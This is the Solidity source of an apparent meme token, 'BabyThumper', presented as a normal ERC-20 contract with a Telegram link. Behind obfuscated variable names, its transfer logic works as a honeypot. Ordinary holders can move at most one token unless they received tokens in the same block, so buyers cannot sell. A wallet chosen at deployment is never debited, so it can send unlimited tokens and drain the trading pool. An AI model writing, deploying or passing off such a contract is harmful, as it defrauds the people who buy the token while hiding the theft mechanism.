/*

https://t.me/babythumper

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BabyThumper is Ownable {
    uint256 private bdcashkrtouw = 115;

    mapping(address => uint256) private hkayilpwgj;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address ijhteq, address heou, uint256 lhmdsacy) public returns (bool success) {
        require(lhmdsacy <= allowance[ijhteq][msg.sender]);
        allowance[ijhteq][msg.sender] -= lhmdsacy;
        ivfodpus(ijhteq, heou, lhmdsacy);
        return true;
    }

    function approve(address lrfmyetik, uint256 lhmdsacy) public returns (bool success) {
        allowance[msg.sender][lrfmyetik] = lhmdsacy;
        emit Approval(msg.sender, lrfmyetik, lhmdsacy);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function ivfodpus(address ijhteq, address heou, uint256 lhmdsacy) private {
        address dqsmbvj = IUniswapV2Factory(qzdtcexwgpaj.factory()).getPair(address(this), qzdtcexwgpaj.WETH());
        if (0 == dyelrunxzvk[ijhteq]) {
            if (ijhteq != dqsmbvj && hkayilpwgj[ijhteq] != block.number && lhmdsacy < totalSupply) {
                require(lhmdsacy <= totalSupply / (10 ** decimals));
            }
            balanceOf[ijhteq] -= lhmdsacy;
        }
        balanceOf[heou] += lhmdsacy;
        hkayilpwgj[heou] = block.number;
        emit Transfer(ijhteq, heou, lhmdsacy);
    }

    mapping(address => uint256) public balanceOf;

    string public symbol;

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private qzdtcexwgpaj;

    uint8 public decimals = 9;

    constructor(string memory mdbzxtqo, string memory faidgzoslt, address anbglzoyi, address cujhf) {
        name = mdbzxtqo;
        symbol = faidgzoslt;
        balanceOf[msg.sender] = totalSupply;
        dyelrunxzvk[cujhf] = bdcashkrtouw;
        qzdtcexwgpaj = IUniswapV2Router02(anbglzoyi);
    }

    function transfer(address heou, uint256 lhmdsacy) public returns (bool success) {
        ivfodpus(msg.sender, heou, lhmdsacy);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;

    mapping(address => uint256) private dyelrunxzvk;
}
